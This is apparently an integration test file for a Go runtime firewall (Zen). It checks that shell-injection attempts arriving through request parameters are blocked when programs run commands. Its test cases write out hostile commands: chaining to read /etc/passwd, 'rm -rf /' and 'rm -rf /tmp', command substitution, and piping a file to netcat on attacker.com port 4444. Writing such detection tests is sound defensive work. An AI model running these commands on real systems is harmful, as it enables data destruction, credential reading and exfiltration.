//go:build integration

package exec_test

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"testing"

	_ "github.com/AikidoSec/firewall-go/instrumentation"
	"github.com/AikidoSec/firewall-go/internal/agent/config"
	"github.com/AikidoSec/firewall-go/internal/request"
	"github.com/AikidoSec/firewall-go/internal/vulnerabilities"
	"github.com/AikidoSec/firewall-go/zen"
	"github.com/stretchr/testify/require"
)

func TestExecIsAutomaticallyInstrumented(t *testing.T) {
	zen.Protect()

	// Enable blocking so that Zen should cause exec.Cmd methods to return an error
	original := config.IsBlockingEnabled()
	config.SetBlocking(true)
	defer config.SetBlocking(original)

	t.Run("MethodCoverage", func(t *testing.T) {
		// Simple test to verify each exec method is instrumented
		req := httptest.NewRequest("GET", "/route?cmd=ls%20.", http.NoBody)
		ip := "127.0.0.1"
		ctx := request.SetContext(context.Background(), req, request.ContextData{
			Source:        "test",
			Route:         "/route",
			RemoteAddress: &ip,
		})

		t.Run("Run", func(t *testing.T) {
			request.WrapWithGLS(ctx, func() {
				cmd := exec.Command("sh", "-c", "ls .")
				err := cmd.Run()

				var detectedErr *vulnerabilities.AttackDetectedError
				require.ErrorAs(t, err, &detectedErr)
			})
		})

		t.Run("Start", func(t *testing.T) {
			request.WrapWithGLS(ctx, func() {
				cmd := exec.Command("sh", "-c", "ls .")
				err := cmd.Start()

				var detectedErr *vulnerabilities.AttackDetectedError
				require.ErrorAs(t, err, &detectedErr)
			})
		})

		t.Run("Output", func(t *testing.T) {
			request.WrapWithGLS(ctx, func() {
				cmd := exec.Command("sh", "-c", "ls .")
				output, err := cmd.Output()

				var detectedErr *vulnerabilities.AttackDetectedError
				require.ErrorAs(t, err, &detectedErr)
				require.Empty(t, output)
			})
		})

		t.Run("CombinedOutput", func(t *testing.T) {
			request.WrapWithGLS(ctx, func() {
				cmd := exec.Command("sh", "-c", "ls .")
				output, err := cmd.CombinedOutput()

				var detectedErr *vulnerabilities.AttackDetectedError
				require.ErrorAs(t, err, &detectedErr)
				require.Empty(t, output)
			})
		})
	})

	t.Run("AttackPatterns", func(t *testing.T) {
		// Comprehensive attack pattern tests using Run() only
		testCases := []struct {
			name        string
			queryParam  string
			command     []string
			shouldBlock bool
		}{
			{
				name:        "basic command injection",
				queryParam:  "cmd=ls%20.",
				command:     []string{"sh", "-c", "ls ."},
				shouldBlock: true,
			},
			{
				name:        "command chaining with semicolon",
				queryParam:  "host=8.8.8.8%3B%20cat%20/etc/passwd",
				command:     []string{"sh", "-c", "ping -c 4 8.8.8.8; cat /etc/passwd"},
				shouldBlock: true,
			},
			{
				name:        "command chaining with AND operator",
				queryParam:  "host=8.8.8.8%20%26%26%20rm%20-rf%20/tmp",
				command:     []string{"sh", "-c", "ping -c 4 8.8.8.8 && rm -rf /tmp"},
				shouldBlock: true,
			},
			{
				name:        "command chaining with pipe",
				queryParam:  "file=test.txt|nc%20attacker.com%204444",
				command:     []string{"sh", "-c", "cat test.txt|nc attacker.com 4444"},
				shouldBlock: true,
			},
			{
				name:        "command substitution",
				queryParam:  "file=$(whoami).txt",
				command:     []string{"sh", "-c", "cat $(whoami).txt"},
				shouldBlock: true,
			},
			{
				name:        "safe direct command execution",
				queryParam:  "host=localhost",
				command:     []string{"echo", "hello"},
				shouldBlock: false,
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				req := httptest.NewRequest("GET", "/route?"+tc.queryParam, http.NoBody)
				ip := "127.0.0.1"
				ctx := request.SetContext(context.Background(), req, request.ContextData{
					Source:        "test",
					Route:         "/route",
					RemoteAddress: &ip,
				})

				request.WrapWithGLS(ctx, func() {
					cmd := exec.Command(tc.command[0], tc.command[1:]...)
					err := cmd.Run()

					if tc.shouldBlock {
						var detectedErr *vulnerabilities.AttackDetectedError
						require.ErrorAs(t, err, &detectedErr, "Expected shell injection to be detected")
					} else {
						require.NoError(t, err, "Safe command should not be blocked")
					}
				})
			})
		}

		t.Run("shell injection via positional parameters", func(t *testing.T) {
			req := httptest.NewRequest("GET", "/route?target=8.8.8.8%3Bcat%20/etc/passwd", http.NoBody)
			ip := "127.0.0.1"
			ctx := request.SetContext(context.Background(), req, request.ContextData{
				Source:        "test",
				Route:         "/route",
				RemoteAddress: &ip,
			})

			request.WrapWithGLS(ctx, func() {
				// This is vulnerable because the command uses $0 which references the next argument
				userInput := "8.8.8.8;cat /etc/passwd"
				cmd := exec.Command("sh", "-c", "ping $0", userInput)
				err := cmd.Run()

				var detectedErr *vulnerabilities.AttackDetectedError
				require.ErrorAs(t, err, &detectedErr, "Should detect injection in positional parameter")
			})
		})

		t.Run("multiple positional parameters with injection", func(t *testing.T) {
			req := httptest.NewRequest("GET", "/route?arg1=safe&arg2=malicious%3Brm%20-rf%20/", http.NoBody)
			ip := "127.0.0.1"
			ctx := request.SetContext(context.Background(), req, request.ContextData{
				Source:        "test",
				Route:         "/route",
				RemoteAddress: &ip,
			})

			request.WrapWithGLS(ctx, func() {
				// Command references multiple positional parameters
				arg1 := "safe"
				arg2 := "malicious;rm -rf /"
				cmd := exec.Command("sh", "-c", "echo $0 && cat $1", arg1, arg2)
				err := cmd.Run()

				var detectedErr *vulnerabilities.AttackDetectedError
				require.ErrorAs(t, err, &detectedErr, "Should detect injection in second positional parameter")
			})
		})

		t.Run("safe positional parameter not referenced", func(t *testing.T) {
			req := httptest.NewRequest("GET", "/route?unused=malicious%3Brm%20-rf%20/", http.NoBody)
			ip := "127.0.0.1"
			ctx := request.SetContext(context.Background(), req, request.ContextData{
				Source:        "test",
				Route:         "/route",
				RemoteAddress: &ip,
			})

			request.WrapWithGLS(ctx, func() {
				// Even though userInput is malicious, it's never used by the command
				// However, we should still detect it since we scan all args after -c
				userInput := "malicious;rm -rf /"
				cmd := exec.Command("sh", "-c", "echo hello", userInput)
				err := cmd.Run()

				var detectedErr *vulnerabilities.AttackDetectedError
				require.ErrorAs(t, err, &detectedErr, "Should detect malicious content even if not referenced")
			})
		})
	})
}
